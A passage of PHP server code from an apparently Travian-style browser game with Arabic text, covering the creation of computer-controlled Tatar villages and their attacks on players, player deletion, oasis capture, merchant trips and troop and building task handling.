$village_name = "قوات اسرع";
$k = 1;
}else if ($s == 2 || $s == 6|| $s == 10) {
$village_name = "المدافع العملاق";
$k = 8;
}else if ($s == 3 || $s == 7|| $s == 11) {
$village_name = "المقاتل الاسطوري";
$k = 3;
}else if ($s == 4 || $s == 8|| $s == 12) {
$village_name = "المهاجم الشرس";
$k = 9;
}
		$date = Date('Y/m/d H:i:s');
$last_art = $result['playerId']."|التتار|".$createdVillage."|".$village_name."|".$date;
            $troops_num = "-1:" . $troops_num;
            $buildings2 = "1 0 0,4 0 0,1 0 0,3 0 0,2 10 0,2 0 0,3 0 0,4 0 0,4 0 0,3 0 0,3 0 0,4 0 0,4 0 0,1 0 0,4 0 0,2 0 0,1 0 0,2 0 0,0 0 0,27 10 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,15 20 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0";
            $this->provider->executeQuery("UPDATE p_villages v SET art_date=NOW(), art_act=NOW(), art_last='%s', buildings='%s', village_name='%s', is_special_village='0', v.troops_num='%s', artefacts='%s', type='%s', is_artefacts='%s', v.is_capital=%s, v.people_count=%s WHERE v.id=%s", array(
                $last_art,
                $buildings2,
                $village_name,
                $troops_num,
                $k,
                $type,
                1,
                $fir ? "1" : "0",
                $fir ? "863" : "60",
                intval($createdVillage)
            ));
            $firstFla = FALSE;
            }
        }
    public function createTatarVillages()
        {
        $q = new QueueModel();
        $delete = $q->provider->fetchRow( "select id from p_players where name='التتار' AND player_type='3'");
        $this->deletePlayer ($delete["id"]);
        require_once(MODEL_PATH . "register.php");
        $map_size = $GLOBALS['SetupMetadata']['map_size'];
        $m        = new RegisterModel();
        $result   = $m->createNewPlayer(tatar_tribe_player, "", "", 5, 0, tatar_tribe_villages, $map_size, PLAYERTYPE_TATAR, 6);
                //pop
        $this->provider->executeQuery ("UPDATE p_players SET registration_date = 0 WHERE id=%s", array(
            intval($result['playerId'])
        ));
        $this->provider->executeQuery("UPDATE p_players p SET p.total_people_count=3466, p.description1='%s', p.guide_quiz='-1' WHERE id=%s", array(
            tatar_tribe_desc,
            intval($result['playerId'])
        ));

// Att
$Att = $this->provider->fetchResultSet ("SELECT id, player_id, rel_x, rel_y FROM p_villages WHERE tribe_id !=5 AND is_oasis!=1 AND NOT ISNULL(player_id)");
while ($Att->next ())
{
$idv = $this->provider->fetchRow ("SELECT v.id, v.player_id, rel_x, rel_y FROM p_villages v WHERE v.is_special_village='1' AND v.is_capital='1'");
$distance = WebHelper::getdistance ($idv['rel_x'], $idv['rel_y'], $Att->row['rel_x'], $Att->row['rel_y'], 200 / 2);
$execution_time = intval ($distance / (5 * 500 ) *  3600);
//41 0,42 0,43 0,44 '.rand(2000,3000).',45 0,46 0,47 0,48 0,49 0,50 0|0|1|||||0
$proc_params =  '41 0,42 0,43 0,44 '.rand(2000,3000).',45 0,46 0,47 0,48 0,49 0,50 0|0|1|||||0';
$this->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $Att->row['player_id'], $Att->row['id'], 15, NULL, $proc_params, 2, $execution_time*2, $execution_time) );
}
//End Att
$this->provider->executeQuery( "UPDATE p_players SET new_gnews=1");
 $this->provider->executeQuery( "UPDATE g_summary SET gnews_text='(كيف سينتهي بنا الحال؟) 
سؤال يتكرر في القرى ونقاط التجمع هذه الأيام، حين يتلاقى الجنود، ويتسامرون أمام نيران معسكراتهم. لقد خاضوا معارك لا تعد، ماتت فيها جنود لا يحصى عددها، وبات حكماء القرى وزعماؤها ورؤساؤها متقدمين جداً في العمر، لدرجة أنهم عاجزون أحياناً عن إقناع أهل القرى الأخرى للانضمام إلى ممالكهم. 
لقد آن الأوان لخوض المعركة الكبرى: معركة ضد عدو مشترك، يتملك كل مقومات القوة والسيطرة المطلقة: إنهم التتار! 
وهكذا، اختار الشجعان في هذا العالم خياراً جرئياً بخوض المعركة الكبرى ضد التتار. فأرسلوا جنودهم، لربما للمرة الأخيرة من أجل احتلال قرى معجزات العالم، لعل سكان هذه الامبراطوريات ومن يحالفهم يتذوق لذة الانتصار بعد طــــــــول انتظار وبعد حروب طويــــلة ومعارك كثيـــرة. 


جيوش ضخمة، سترحل عن أهلها، معظمها لن يعود .... أخبار شجاعة وقوة أفرادها ودهاء قادتهم وحنكتهم ستسجل في التاريخ أعظم الشهادات وستكون مجال الفخر لأهلهم على مدى العصور القادمة. 

هيا إلى المجد ..... هيا إلى قتال التتار، نسأل الله أن يكون التوفيق في صفكم. 


من أجل احتلال قرية معجزة 
يجب أن تقتل جيش التتار الموجود في القرية وتبيده عن آخره 
يجب أن ترسل زعماء (حوالي ستة) إلى القرية ليتم احتلالها 
لا حاجة لإرسال المقاليع إلى قرية المعجزة!'");
        $troop_ids = array();
        foreach ($GLOBALS['GameMetadata']['troops'] as $k => $v)
            {
            if ($v['for_tribe_id'] == 5)
                {
                $troop_ids[] = $k;
                }
            }
        $firstFlag = TRUE;
        foreach ($result['villages'] as $createdVillage => $v)
            {
            $troops_num = "";
            foreach ($troop_ids as $tid)
                {
                if ($troops_num != "")
                    {
                    $troops_num .= ",";
                    }
if ($tid == 49 || $tid == 50) {
$num = 0;
}else if ($tid == 44 || $tid == 47 || $tid == 48) {
$num = mt_rand(255, 499)*$GLOBALS['GameMetadata']['game_speed'];
}else if ($tid == 45 || $tid == 46) {
$num = mt_rand(321, 581)*$GLOBALS['GameMetadata']['game_speed'];
}else {
$num = mt_rand(821, 981)*$GLOBALS['GameMetadata']['game_speed'];
}
$num = ($num*3);
                $troops_num .= sprintf("%s %s", $tid, $num);
                }
            $troops_num = "-1:" . $troops_num;
$vb = "1 0 0,4 0 0,1 0 0,3 0 0,2 0 0,2 0 0,3 0 0,4 0 0,4 0 0,3 0 0,3 0 0,4 0 0,4 0 0,1 0 0,4 0 0,2 0 0,1 0 0,2 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,40 0 0,40 0 0,0 0 0,0 0 0,40 0 0,40 0 0,0 0 0,0 0 0,40 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,16 1 0,0 0 0";

            $this->provider->executeQuery("UPDATE p_villages v SET v.troops_num='%s',v.buildings='%s', v.is_capital=%s, v.people_count=%s WHERE v.id=%s", array(
                $troops_num,
                $vb,
                $firstFlag ? "1" : "0",
                $firstFlag ? "1362" : "263",
                intval($createdVillage)
            ));
            $firstFlag = FALSE;
            }
        }




    public function deletePlayer($playerId)
        {
        $playerId = intval($playerId);
        if ($playerId <= 0)
            {
            return;
            }
        $row = $this->provider->fetchRow("SELECT p.alliance_id, p.villages_id, p.tribe_id, p.is_active FROM p_players p WHERE id=%s", array(
            $playerId
        ));
        if ($row == NULL)
            {
            return;
            }
        $this->provider->executeQuery("UPDATE p_msgs m SET m.to_player_id=IF(m.to_player_id=%s, NULL, m.to_player_id), m.from_player_id=IF(m.from_player_id=%s, NULL, m.from_player_id)", array(
            $playerId,
            $playerId
        ));
        $this->provider->executeQuery("UPDATE p_rpts r SET r.to_player_id=IF(r.to_player_id=%s, NULL, r.to_player_id), r.from_player_id=IF(r.from_player_id=%s, NULL, r.from_player_id)", array(
            $playerId,
            $playerId
        ));
        if (0 < intval($row['alliance_id']))
            {
            $this->provider->executeQuery("UPDATE p_alliances SET player_count=player_count-1 WHERE id=%s", array(
                intval($row['alliance_id'])
            ));
            $_aRow = $this->provider->fetchRow("SELECT a.players_ids, a.player_count FROM p_alliances a WHERE a.id=%s", array(
                intval($row['alliance_id'])
            ));
            if ($_aRow['player_count'] <= 0)
                {
                $this->provider->executeQuery("DELETE FROM p_alliances WHERE id=%s", array(
                    intval($row['alliance_id'])
                ));
                }
            else
                {
                $aplayers_ids = $_aRow['players_ids'];
                if (trim($aplayers_ids) != "")
                    {
                    $newPlayers_ids  = "";
                    $aplayers_idsArr = explode(",", $aplayers_ids);
                    foreach ($aplayers_idsArr as $pid)
                        {
                        if ($pid == $playerId)
                            {
                            continue;
                            }
                        if ($newPlayers_ids != "")
                            {
                            $newPlayers_ids .= ",";
                            }
                        $newPlayers_ids .= $pid;
                        }
                    $this->provider->executeQuery("UPDATE p_alliances SET players_ids='%s' WHERE id=%s", array(
                        $newPlayers_ids,
                        intval($row['alliance_id'])
                    ));
                    }
                }
            }
        $this->provider->executeQuery("DELETE FROM p_merchants WHERE player_id=%s", array(
            $playerId
        ));
//artefacts=NULL, type=NULL, is_artefacts=NULL
        $this->provider->executeQuery("UPDATE p_villages v \r\n\t\t\tSET \r\n\t\t\t\tv.tribe_id=IF(v.is_oasis=1, 4, 0),\r\n\t\t\t\tv.parent_id=NULL,\r\n\t\t\t\tv.player_id=NULL,\r\n\t\t\t\tv.alliance_id=NULL,\r\n\t\t\t\tv.player_name=NULL,\r\n\t\t\t\tv.village_name=NULL,\r\n\t\t\t\tv.alliance_name=NULL,\r\n\t\t\t\tv.is_capital=0,\r\n\t\t\t\tv.people_count=2,\r\n\t\t\t\tv.crop_consumption=2,\r\n\t\t\t\tv.time_consume_percent=100,\r\n\t\t\t\tv.offer_merchants_count=0,\r\n\t\t\t\tv.resources=NULL,\r\n\t\t\t\tv.cp=NULL,\r\n\t\t\t\tv.buildings=NULL,\r\n\t\t\t\tv.troops_training=NULL,\r\n\t\t\t\tv.child_villages_id=NULL,\r\n\t\t\t\tv.village_oases_id=NULL,\r\n\t\t\t\tv.troops_trapped_num=0,\r\n\t\t\t\tv.allegiance_percent=100,\r\n\t\t\t\tv.troops_num=IF(v.is_oasis=1, '-1:31 0,34 0,37 0', NULL),\r\n\t\t\t\tv.troops_out_num=NULL,artefacts=NULL, type=NULL, is_artefacts=NULL,\r\n\t\t\t\tv.troops_intrap_num=NULL,\r\n\t\t\t\tv.troops_out_intrap_num=NULL,\r\n\t\t\t\tv.creation_date=NOW()\r\n\t\t\tWHERE v.player_id=%s", array(
            $playerId
        ));
        $this->provider->executeQuery("DELETE FROM p_players WHERE id=%s", array(
            $playerId
        ));
        $this->provider->executeQuery("DELETE FROM p_profile WHERE userid=%s", array(
            $playerId
        ));
        $this->provider->executeQuery("DELETE FROM p_comment WHERE userid=%s OR to_userid=%s", array(
            $playerId,
            $playerId
        ));
        $this->provider->executeQuery("DELETE FROM p_friends WHERE playerid1=%s OR playerid2=%s", array(
            $playerId,
            $playerId
        ));
        $this->provider->executeQuery("UPDATE g_summary \r\n\t\t\tSET \r\n\t\t\t\tplayers_count=players_count-1,\r\n\t\t\t\tactive_players_count=active_players_count-%s,\r\n\t\t\t\tDboor_players_count=Dboor_players_count-%s,\r\n\t\t\t\tArab_players_count=Arab_players_count-%s,\r\n\t\t\t\tRoman_players_count=Roman_players_count-%s,\r\n\t\t\t\tTeutonic_players_count=Teutonic_players_count-%s,\r\n\t\t\t\tGallic_players_count=Gallic_players_count-%s", array(
            $row['is_active'] ? 1 : 0,
            $row['tribe_id'] == 6 ? 1 : 0,
            $row['tribe_id'] == 7 ? 1 : 0,
            $row['tribe_id'] == 1 ? 1 : 0,
            $row['tribe_id'] == 2 ? 1 : 0,
            $row['tribe_id'] == 3 ? 1 : 0
        ));
        }
    public function captureOasis($oasisId, $playerId, $villageId, $capture = TRUE)
        {
        $villageRow = $this->provider->fetchRow("SELECT\r\n\t\t\t\tv.player_id,\r\n\t\t\t\tv.tribe_id,\r\n\t\t\t\tv.alliance_id,\r\n\t\t\t\tv.player_name,\r\n\t\t\t\tv.alliance_name,\r\n\t\t\t\tv.resources,\r\n\t\t\t\tv.cp,\r\n\t\t\t\tv.crop_consumption,\r\n\t\t\t\tv.village_oases_id,\r\n\t\t\t\tTIME_TO_SEC(TIMEDIFF(NOW(), v.last_update_date)) elapsedTimeInSeconds \r\n\t\t\tFROM p_villages v\r\n\t\t\tWHERE v.id=%s", array(
            intval($villageId)
        ));
        if (intval($villageRow['player_id']) == 0 || intval($villageRow['player_id']) != $playerId)
            {
            return;
            }
        if ($capture)
            {
            $this->provider->executeQuery("UPDATE p_villages v\r\n\t\t\t\tSET\r\n\t\t\t\t\tv.parent_id=%s,\r\n\t\t\t\t\tv.tribe_id=%s,\r\n\t\t\t\t\tv.player_id=%s,\r\n\t\t\t\t\tv.alliance_id=%s,\r\n\t\t\t\t\tv.player_name='%s',\r\n\t\t\t\t\tv.alliance_name='%s',\r\n\t\t\t\t\tv.troops_num=NULL,\r\n\t\t\t\t\tv.troops_out_num=NULL,\r\n\t\t\t\t\tv.troops_intrap_num=NULL,\r\n\t\t\t\t\tv.troops_out_intrap_num=NULL,\r\n\t\t\t\t\tv.allegiance_percent=100,\r\n\t\t\t\t\tv.creation_date=NOW(),\r\n\t\t\t\t\tv.last_update_date=NOW()\r\n\t\t\t\tWHERE v.id=%s", array(
                intval($villageId),
                intval($villageRow['tribe_id']),
                intval($villageRow['player_id']),
                0 < intval($villageRow['alliance_id']) ? intval($villageRow['alliance_id']) : "NULL",
                $villageRow['player_name'],
                $villageRow['alliance_name'],
                intval($oasisId)
            ));
            }
        else
            {
            $this->provider->executeQuery("UPDATE p_villages v \r\n\t\t\t\tSET \r\n\t\t\t\t\tv.tribe_id=4,\r\n\t\t\t\t\tv.parent_id=NULL,\r\n\t\t\t\t\tv.player_id=NULL,\r\n\t\t\t\t\tv.alliance_id=NULL,\r\n\t\t\t\t\tv.player_name=NULL,\r\n\t\t\t\t\tv.village_name=NULL,\r\n\t\t\t\t\tv.alliance_name=NULL,\r\n\t\t\t\t\tv.troops_num='-1:31 0,34 0,37 0',\r\n\t\t\t\t\tv.troops_out_num=NULL,\r\n\t\t\t\t\tv.troops_intrap_num=NULL,\r\n\t\t\t\t\tv.troops_out_intrap_num=NULL,\t\t\t\t\t\r\n\t\t\t\t\tv.allegiance_percent=100,\r\n\t\t\t\t\tv.creation_date=NOW()\r\n\t\t\t\tWHERE v.id=%s", array(
                intval($oasisId)
            ));
            }
        $village_oases_id = "";
        if ($capture)
            {
            $village_oases_id = trim($villageRow['village_oases_id']);
            if ($village_oases_id != "")
                {
                $village_oases_id .= ",";
                }
            $village_oases_id .= $oasisId;
            }
        else if (trim($villageRow['village_oases_id']) != "")
            {
            $village_oases_idArr = explode(",", $villageRow['village_oases_id']);
            foreach ($village_oases_idArr as $oid)
                {
                if ($oid == $oasisId)
                    {
                    continue;
                    }
                if ($village_oases_id != "")
                    {
                    $village_oases_id .= ",";
                    }
                $village_oases_id .= $oid;
                }
            }
        $resultArr  = $this->_getResourcesArray($villageRow['resources'], $villageRow['elapsedTimeInSeconds'], $villageRow['crop_consumption'], $villageRow['cp']);
        $oasisIndex = $this->provider->fetchScalar("SELECT v.image_num FROM p_villages v WHERE v.id=%s", array(
            intval($oasisId)
        ));
        $oasisRes   = $GLOBALS['SetupMetadata']['oasis'][$oasisIndex];
        $factor     = $capture ? 1 : 0 - 1;
        foreach ($oasisRes as $k => $v)
            {
            $resultArr['resources'][$k]['prod_rate_percentage'] += $v * $factor;
            if ($resultArr['resources'][$k]['prod_rate_percentage'] < 0)
                {
                $resultArr['resources'][$k]['prod_rate_percentage'] = 0;
                }
            }
        $this->provider->executeQuery("UPDATE p_villages v \r\n\t\t\tSET\r\n\t\t\t\tv.resources='%s',\r\n\t\t\t\tv.cp='%s',\r\n\t\t\t\tv.village_oases_id='%s',\r\n\t\t\t\tv.last_update_date=NOW()\r\n\t\t\tWHERE v.id=%s", array(
            $this->_getResourcesString($resultArr['resources']),
            $resultArr['cp']['cpValue'] . " " . $resultArr['cp']['cpRate'],
            $village_oases_id,
            intval($villageId)
        ));
        }
    public function executeLeaveOasisTask($taskRow)
        {
        $this->captureOasis($taskRow['building_id'], $taskRow['player_id'], $taskRow['village_id'], FALSE);
        }
	public function rebroadcastMerchant($taskRow)
        {
        $merchantNum = explode( "|", $taskRow['proc_params'] );
        list( $merchantNum, $resStr, $send ) = $merchantNum;
		$resStr = explode( " ", $resStr );
		if($send > 1 ){
		$village = $this->provider->fetchRow("SELECT v.resources FROM p_villages v WHERE v.id=%s", array( intval($taskRow['village_id']) ));

		$ifresources = explode(' ', $village['resources'] );
		if($resStr[0] < $ifresources[1] AND $resStr[1] < $ifresources[6] AND $resStr[2] < $ifresources[11] AND $resStr[3] < $ifresources[16]){
		$r_arr = explode( ",", $village['resources'] );
		$i = 1;
		$ir = 0;
		foreach ( $r_arr as $r_str ){
		$r2 = explode(' ', $r_str );
		$r22 = $r2[1]-$resStr[$ir];
		$res .= $r2[0].' '.$r22.' '.$r2[2].' '.$r2[3].' '.$r2[4].' '.$r2[5];
		if($i != 4){ $res .= ','; }
		$i++;
		$ir++;
		}
		$this->provider->executeQuery("UPDATE p_villages v SET v.resources='%s' WHERE v.id=%s", array( $res, intval($taskRow['village_id']) ));
		$newQueueModel = new QueueModel();
        $newTask = new QueueTask( QS_MERCHANT_GO, $taskRow['player_id'], $taskRow['execution_time'] );
		$newTask->villageId = $taskRow['village_id'];
		$newTask->toPlayerId = $taskRow['to_player_id'];
		$newTask->toVillageId = $taskRow['to_village_id'];
		$newTask->procParams = $merchantNum."|".( $resStr[0]." ".$resStr[1]." ".$resStr[2]." ".$resStr[3]."|".($send-1) );
		$newTask->tag = array( "1" => $resStr[0], "2" => $resStr[1], "3" => $resStr[2], "4" => $resStr[3] );
		$newQueueModel->addTask( $newTask );
		}
		}

        }
    public function executeMerchantTask($taskRow)
        {
        $villageRow = $this->provider->fetchRow("SELECT\r\n\t\t\t\tv.player_id,\r\n\t\t\t\tv.resources,\r\n\t\t\t\tv.cp,\r\n\t\t\t\tv.crop_consumption,\r\n\t\t\t\tTIME_TO_SEC(TIMEDIFF(NOW(), v.last_update_date)) elapsedTimeInSeconds \r\n\t\t\tFROM p_villages v\r\n\t\t\tWHERE v.id=%s", array(
            intval($taskRow['to_village_id'])
        ));
        if (0 < intval($villageRow['player_id']))
            {
            $resultArr = $this->_getResourcesArray($villageRow['resources'], $villageRow['elapsedTimeInSeconds'], $villageRow['crop_consumption'], $villageRow['cp']);
            list($merchantNum, $resourcesStr) = explode('|', $taskRow['proc_params']);
            $resources = explode(" ", $resourcesStr);
            $i         = 0;
            foreach ($resources as $v)
                {
                $resultArr['resources'][++$i]['current_value'] += $v;
                if ($resultArr['resources'][$i]['store_max_limit'] < $resultArr['resources'][$i]['current_value'])
                    {
                    $resultArr['resources'][$i]['current_value'] = $resultArr['resources'][$i]['store_max_limit'];
                    }
                }
            $this->provider->executeQuery("UPDATE p_villages v \r\n\t\t\t\tSET\r\n\t\t\t\t\tv.resources='%s',\r\n\t\t\t\t\tv.cp='%s',\r\n\t\t\t\t\tv.last_update_date=NOW()\r\n\t\t\t\tWHERE v.id=%s", array(
                $this->_getResourcesString($resultArr['resources']),
                $resultArr['cp']['cpValue'] . " " . $resultArr['cp']['cpRate'],
                intval($taskRow['to_village_id'])
            ));
            }
        if (intval($this->provider->fetchScalar("SELECT v.player_id FROM p_villages v WHERE v.id=%s", array(
            intval($taskRow['village_id'])
        ))) == 0)
            {
            return FALSE;
            }
        $this->provider->executeQuery("UPDATE p_queue q \r\n\t\t\tSET \r\n\t\t\t\tq.proc_type=%s,\r\n\t\t\t\tq.end_date=(q.end_date + INTERVAL q.execution_time SECOND)\r\n\t\t\tWHERE q.id=%s", array(
            QS_MERCHANT_BACK,
            intval($taskRow['id'])
        ));
        $timeInSeconds = $taskRow['remainingTimeInSeconds'];
        list($merchantsNum, $body) = explode('|', $taskRow['proc_params']);
        $res      = explode(" ", $body);
        $maxValue = 0;
        $maxIndex = 0 - 1;
        $n        = 0;
        foreach ($res as $v)
            {
            ++$n;
            if ($maxValue < $v)
                {
                $maxValue = $v;
                $maxIndex = $n;
                }
            }
        $reportResult = 10 + $maxIndex;
        $r            = new ReportModel();
        $r->createReport($taskRow['player_id'], $taskRow['to_player_id'], $taskRow['village_id'], $taskRow['to_village_id'], 1, $reportResult, $body, $timeInSeconds);
        return TRUE;
        }
    public function executeHeroTask($taskRow)
        {
        list($hero_troop_id, $hero_in_village_id) = explode(' ', $taskRow['proc_params']);
        $playerRow = $this->provider->fetchRow("SELECT p.villages_id, hero_name, p.selected_village_id FROM p_players p WHERE p.id=%s", array(
            intval($taskRow['player_id'])
        ));
        if ($playerRow == NULL || trim($playerRow['villages_id']) == "")
            {
            return;
            }
        $hasVillage     = FALSE;
        $villages_idArr = explode(",", trim($playerRow['villages_id']));
        foreach ($villages_idArr as $pvid)
            {
            if ($pvid == $hero_in_village_id)
                {
                $hasVillage = TRUE;
                break;
                }
            }
        if (!$hasVillage)
            {
            $hero_in_village_id = $playerRow['selected_village_id'];
            }
if ($playerRow['hero_name'] == "") {
        $this->provider->executeQuery("UPDATE p_players p SET p.hero_name=p.name WHERE p.id=%s", array(
            intval($taskRow['player_id'])
        ));
}
        $this->provider->executeQuery("UPDATE p_players p SET p.hero_troop_id=%s, p.hero_in_village_id=%s WHERE p.id=%s", array(
            intval($hero_troop_id),
            intval($hero_in_village_id),
            intval($taskRow['player_id'])
        ));
        }
 public function executeTroopTrainingTask( $taskRow )
 {
 $villageRow = $this->provider->fetchRow( "SELECT\r\n\t\t\t\tv.player_id,\r\n\t\t\t\tv.resources,\r\n\t\t\t\tv.cp,\r\n\t\t\t\tv.crop_consumption,\r\n\t\t\t\tv.time_consume_percent,\r\n\t\t\t\tv.troops_num,\r\n\t\t\t\tTIME_TO_SEC(TIMEDIFF(NOW(), v.last_update_date)) elapsedTimeInSeconds \r\n\t\t\tFROM p_villages v\r\n\t\t\tWHERE v.id=%s", array(
 intval( $taskRow['village_id'] )
 ) );
 if ( intval( $villageRow['player_id'] ) == 0 || intval( $villageRow['player_id'] ) != $taskRow['player_id'] )
 {
 return;
 }
 $resultArr = $this->_getResourcesArray( $villageRow['resources'], $villageRow['elapsedTimeInSeconds'], $villageRow['crop_consumption'], $villageRow['cp'] );
 $troopId = $taskRow['proc_params'];
 $troopsNumber = $taskRow['threads_completed_num'];
 $troops_crop_consumption = $troopsNumber * $GLOBALS['GameMetadata']['troops'][$troopId]['crop_consumption'];
 $troopsArray = $this->_getTroopsArray( $villageRow['troops_num'] );
 if ( isset( $troopsArray[0 - 1] ) )
 {
 if ( isset( $troopsArray[0 - 1][$troopId] ) )
 {
 $troopsArray[0 - 1][$troopId] += $troopsNumber;
 }
 else if ( $troopId == 99 )
 {
 $troopsArray[0 - 1][$troopId] = $troopsNumber;
 }
 }
 $troopTrainingStr = $this->_getTroopsString( $troopsArray );
 $this->provider->executeQuery( "UPDATE p_villages v \r\n\t\t\tSET\r\n\t\t\t\tv.resources='%s',\r\n\t\t\t\tv.cp='%s',\r\n\t\t\t\tv.crop_consumption=v.crop_consumption+%s,\r\n\t\t\t\tv.troops_num='%s',\r\n\t\t\t\tv.last_update_date=NOW()\r\n\t\t\tWHERE v.id=%s", array(
 $this->_getResourcesString( $resultArr['resources'] ),
 $resultArr['cp']['cpValue']." ".$resultArr['cp']['cpRate'],
 $troops_crop_consumption,
 $troopTrainingStr,
 intval( $taskRow['village_id'] )
 ) );
 }
    public function executeCelebrationTask($taskRow)
        {
        $villageRow = $this->provider->fetchRow("SELECT\r\n\t\t\t\tv.player_id,\r\n\t\t\t\tv.resources,\r\n\t\t\t\tv.cp,\r\n\t\t\t\tv.crop_consumption,\r\n\t\t\t\tTIME_TO_SEC(TIMEDIFF(NOW(), v.last_update_date)) elapsedTimeInSeconds \r\n\t\t\tFROM p_villages v\r\n\t\t\tWHERE v.id=%s", array(
            intval($taskRow['village_id'])
        ));
        if (intval($villageRow['player_id']) == 0)
            {
            return;
            }
        $resultArr       = $this->_getResourcesArray($villageRow['resources'], $villageRow['elapsedTimeInSeconds'], $villageRow['crop_consumption'], $villageRow['cp']);
        $celebrationType = $taskRow['proc_params'] == 1 ? "small" : "large";
        $resultArr['cp']['cpValue'] += $GLOBALS['GameMetadata']['items'][24]['celebrations'][$celebrationType]['value'];
        $this->provider->executeQuery("UPDATE p_villages v \r\n\t\t\tSET\r\n\t\t\t\tv.resources='%s',\r\n\t\t\t\tv.cp='%s',\r\n\t\t\t\tv.last_update_date=NOW()\r\n\t\t\tWHERE v.id=%s", array(
            $this->_getResourcesString($resultArr['resources']),
            $resultArr['cp']['cpValue'] . " " . $resultArr['cp']['cpRate'],
            intval($taskRow['village_id'])
        ));
        }
    public function executeTroopUpgradeTask($taskRow)
        {
        $villageRow = $this->provider->fetchRow("SELECT\r\n\t\t\t\tv.player_id,\r\n\t\t\t\tv.troops_training\r\n\t\t\tFROM p_villages v\r\n\t\t\tWHERE v.id=%s", array(
            intval($taskRow['village_id'])
        ));
        if (intval($villageRow['player_id']) == 0 || intval($villageRow['player_id']) != $taskRow['player_id'])
            {
            return;
            }
        $this->troopsUpgrade = array();
        $_arr                = explode(",", $villageRow['troops_training']);
        foreach ($_arr as $troopStr)
            {
            list($troopId, $researches_done, $defense_level, $attack_level) = explode(' ', $troopStr);
            $this->troopsUpgrade[$troopId] = array(
                "researches_done" => $researches_done,
                "defense_level" => $defense_level,
                "attack_level" => $attack_level
            );
            }
        switch ($taskRow['proc_type'])
        {
            case QS_TROOP_RESEARCH:
                {
                $tid = $taskRow['proc_params'];
                if (isset($this->troopsUpgrade[$tid]))
                    {
                    $this->troopsUpgrade[$tid]['researches_done'] = 1;
                    }
                break;
                }
            case QS_TROOP_UPGRADE_ATTACK:
                {
                }
            case QS_TROOP_UPGRADE_DEFENSE:
                {
                list($tid, $level) = explode(' ', $taskRow['proc_params']);
                if (isset($this->troopsUpgrade[$tid]))
                    {
                    $this->troopsUpgrade[$tid]['defense_level'] = $level;
                    }
                if (isset($this->troopsUpgrade[$tid]))
                    {
                    $this->troopsUpgrade[$tid]['attack_level'] = $level;
                    }
                break;

                }
        }
        $troopTrainingStr = "";
        foreach ($this->troopsUpgrade as $k => $v)
            {
            if ($troopTrainingStr != "")
                {
                $troopTrainingStr .= ",";
                }
            $troopTrainingStr .= $k . " " . $v['researches_done'] . " " . $v['defense_level'] . " " . $v['attack_level'];
            }
        $this->provider->executeQuery("UPDATE p_villages v\r\n\t\t\tSET\r\n\t\t\t\tv.troops_training='%s'\r\n\t\t\tWHERE v.id=%s", array(
            $troopTrainingStr,
            intval($taskRow['village_id'])
        ));
        }

	function executePlusTask($taskRow, $resource_id)
	{
		$villageRow = $this->provider->fetchRow('SELECT
				v.player_id,
				v.resources,
				v.cp,
				v.crop_consumption,
				TIME_TO_SEC(TIMEDIFF(NOW(), v.last_update_date)) elapsedTimeInSeconds
			FROM p_villages v
			WHERE v.id=%s', array(
			intval($taskRow['village_id'])
		));
		if (intval($villageRow['player_id']) == 0)
		{
			return null;
		}
		$resultArr = $this->_getResourcesArray($villageRow['resources'], $villageRow['elapsedTimeInSeconds'], $villageRow['crop_consumption'], $villageRow['cp']);
		$resultArr['resources'][$resource_id]['prod_rate_percentage'] -= 25;
		if ($resultArr['resources'][$resource_id]['prod_rate_percentage'] < 0)
		{
			$resultArr['resources'][$resource_id]['prod_rate_percentage'] = 0;
		}
		$this->provider->executeQuery('UPDATE p_villages v
			SET
				v.resources=\'%s\',
				v.cp=\'%s\',
				v.last_update_date=NOW()
			WHERE v.id=%s', array(
			$this->_getResourcesString($resultArr['resources']),
			$resultArr['cp']['cpValue'] . ' ' . $resultArr['cp']['cpRate'],
			intval($taskRow['village_id'])
		));
		//$this->cropBalance ($taskRow['player_id'], $taskRow['village_id']);
	}
    public function executeBuildingTask($taskRow, $drop = FALSE)
        {
// attack tatar to WW (5,25,50,75,90...99)
if ($taskRow["building_id"] == "40")
				{	
$qj = new QueueModel();
$playerId      = $taskRow["player_id"];
$my_id_village =  $taskRow["village_id"];
$attack_tatar_village = $qj->provider->fetchRow ('SELECT v.tatar, v.buildings FROM p_villages v WHERE v.id=%s', array ( $my_id_village ) );
$attack_tatar_tatar = $attack_tatar_village['tatar'];
$attack_tatar_buildings = $attack_tatar_village['buildings'];
$pos = strpos($attack_tatar_buildings,'40 ');
if($pos === false) { $miracle_level = 0; } else {
$miracle_level = split("40", $attack_tatar_buildings);
$miracle_level = split(" ", $miracle_level[1]);
$miracle_level = $miracle_level[1]+1;
}
$execution_time = 60;
$s = ceil($attack_tatar_tatar)+1;
$t1 = mt_rand(350, 500)*$GLOBALS['GameMetadata']['game_speed']*$s;
$t2 = mt_rand(250, 400)*$GLOBALS['GameMetadata']['game_speed']*$s;
$t3 = mt_rand(200, 1000)*50;
$t4 = mt_rand(1, 3);
$proc_params =  '41 '.$t1.',42 '.$t1.',43 '.$t1.',44 0,45 '.$t2.',46 '.$t2.',47 '.$t3.',48 '.$t3.',49 '.$t4.',50 0|0|0|1:40||||0';
$idv = $qj->provider->fetchRow ("SELECT v.id, v.player_id, rel_x, rel_y FROM p_villages v WHERE v.is_special_village='1' AND v.is_capital='1'");
//start




if ($miracle_level < 5) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =0 WHERE id='.$my_id_village.'');
}else if ($miracle_level < 25) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =1 WHERE id='.$my_id_village.'');
}else if ($miracle_level < 50) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =2 WHERE id='.$my_id_village.'');
}else if ($miracle_level < 75) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =3 WHERE id='.$my_id_village.'');
}else if ($miracle_level < 90) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =4 WHERE id='.$my_id_village.'');
}else if ($miracle_level == 91) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =5 WHERE id='.$my_id_village.'');
